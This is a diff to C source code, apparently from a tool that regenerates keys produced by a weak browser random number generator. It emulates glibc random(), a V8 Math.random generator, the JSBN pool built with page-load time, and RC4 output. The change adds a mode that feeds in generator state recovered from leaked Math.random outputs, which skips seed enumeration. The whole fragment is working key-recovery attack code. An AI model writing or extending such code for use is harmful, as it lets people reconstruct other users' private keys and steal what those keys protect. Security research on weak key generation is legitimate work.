@@ -32,6 +32,9 @@ typedef struct {
     uint32_t key_count;      /* keys generated per (seed, t1, dt2) group */
     uint32_t rc4_offset;     /* RC4 stream bytes skipped before key 0 */
     uint64_t seed_count;     /* number of seeds */
+    uint32_t mode;           /* 0 = libc seed, 1 = direct random_base state */
+    uint32_t mwc_s0;         /* state words for mode 1 */
+    uint32_t mwc_s1;
 } rs_params;
 
 /* ------------------------------- glibc random() ------------------------- */
@@ -88,15 +91,21 @@ static uint32_t v8_next(rs_v8 *v) {
 
 /* Build the JSBN pool with the page-load time XOR (t1 -> bytes 0..3). */
 static void build_pool(const rs_params *p, uint32_t seed, uint32_t t1, uint8_t pool[POOL_SIZE]) {
-    rs_glibc g;
-    glibc_init(&g, seed);
-    for (uint32_t i = 0; i < p->context_index; i++) {
-        glibc_next(&g);
-        glibc_next(&g);
-    }
     rs_v8 v;
-    v.s0 = glibc_next(&g);
-    v.s1 = glibc_next(&g);
+    if (p->mode == 1) {
+        /* State recovered from leaked Math.random outputs; no seed enumeration. */
+        v.s0 = p->mwc_s0;
+        v.s1 = p->mwc_s1;
+    } else {
+        rs_glibc g;
+        glibc_init(&g, seed);
+        for (uint32_t i = 0; i < p->context_index; i++) {
+            glibc_next(&g);
+            glibc_next(&g);
+        }
+        v.s0 = glibc_next(&g);
+        v.s1 = glibc_next(&g);
+    }
     for (uint32_t i = 0; i < p->math_offset; i++) v8_next(&v);
     for (int i = 0; i < POOL_SIZE; i += 2) {
         uint32_t t = v8_next(&v) >> 16;
